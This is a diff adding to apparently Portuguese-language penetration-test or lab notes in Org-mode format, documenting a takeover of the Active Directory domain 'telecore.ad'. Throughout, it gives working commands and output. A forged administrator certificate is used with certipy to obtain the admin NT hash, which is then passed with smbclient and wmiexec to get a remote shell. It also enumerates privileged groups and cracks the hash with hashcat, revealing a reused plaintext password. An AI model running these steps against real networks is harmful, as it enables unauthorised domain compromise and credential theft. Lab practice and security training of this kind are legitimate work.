@@ -30,3 +30,92 @@ certipy req -debug -u 'tel_engineer01@telecore.ad' \
 -upn 'administrator@telecore.ad' \
 -sid S-1-5-21-1588247407-410625039-1511794522-500
 #+end_src
+
+o arquivo *administrator.pfx* será gerado, pegar o NT hash do admin com ele -->
+#+begin_src sh
+certipy auth -debug -pfx administrator.pfx -dc-ip 10.5.2.2
+
+[*] Certificate identities:
+[*]     SAN UPN: 'administrator@telecore.ad'
+[*]     SAN URL SID: 'S-1-5-21-1588247407-410625039-1511794522-500'
+[*]     Security Extension SID: 'S-1-5-21-1588247407-410625039-1511794522-500'
+[+] Found SID in SAN URL: 'S-1-5-21-1588247407-410625039-1511794522-500'
+[+] Found SID in security extension: 'S-1-5-21-1588247407-410625039-1511794522-500'
+[*] Using principal: 'administrator@telecore.ad'
+[*] Trying to get TGT...
+[+] Sending AS-REQ to KDC telecore.ad (10.5.2.2)
+[*] Got TGT
+[*] Saving credential cache to 'administrator.ccache'
+[+] Attempting to write data to 'administrator.ccache'
+[+] Data written to 'administrator.ccache'
+[*] Wrote credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@telecore.ad': aad3b435b51404eeaad3b435b51404ee:bfb19bca32a6aab8e0b9a836da860e32
+#+end_src
+
+podemos testar o hash (segunda parte do delimiter ":") com o smbclient -->
+#+begin_src sh
+smbclient -L 10.5.2.2 -U 'administrator%bfb19bca32a6aab8e0b9a836da860e32' --pw-nt-hash
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share
+        SYSVOL          Disk      Logon server share
+#+end_src
+
+* wmiexec
+com o NT hash do admin, podemos usar o wmiexec tambem para conseguir um shell -->
+#+begin_src sh
+wmiexec.py -hashes :bfb19bca32a6aab8e0b9a836da860e32 'administrator@10.5.2.2'
+
+Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>whoami
+telecore\administrator
+
+C:\>net group
+#+end_src
+
+enumerando alguns grupos com este shell -->
+#+begin_src sh
+C:\>net group "Domain Admins"
+Group name     Domain Admins
+Comment        Designated administrators of the domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator
+The command completed successfully.
+
+
+C:\>net group "ESX Admins"
+Group name     ESX Admins
+Comment
+
+Members
+
+-------------------------------------------------------------------------------
+virt-admin
+The command completed successfully.
+#+end_src
+
+tentando quebrar o NT hash do admin com o hashcat -->
+#+begin_src sh
+hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/kali-wordlists/rockyou.txt
+#+end_src
+
+após a execução, verificar o resultad -->
+#+begin_src sh
+hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/kali-wordlists/rockyou.txt --show
+
+bfb19bca32a6aab8e0b9a836da860e32:August1990password
+#+end_src
+
+é possível conectar via SSH com estas creds!
